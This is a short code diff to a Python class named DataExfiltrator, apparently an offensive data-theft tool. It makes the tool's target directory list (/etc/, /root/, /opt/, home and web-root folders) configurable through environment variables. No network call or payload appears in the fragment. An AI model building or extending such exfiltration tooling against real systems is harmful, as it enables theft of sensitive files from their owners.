@@ -401,11 +401,14 @@ class DataExfiltrator:
             "*.log"
         ]
         
-        # Target directories
+        # Target directories (on target system)
+        target_home = os.getenv('TARGET_HOME_DIR', '/home')
+        target_web_root = os.getenv('TARGET_WEB_ROOT', '/var/www')
+        
         target_dirs = [
             "/etc/",
-            "/var/www/",
-            "/home/",
+            f"{target_web_root}/",
+            f"{target_home}/",
             "/root/",
             "/opt/",
             "/usr/local/",
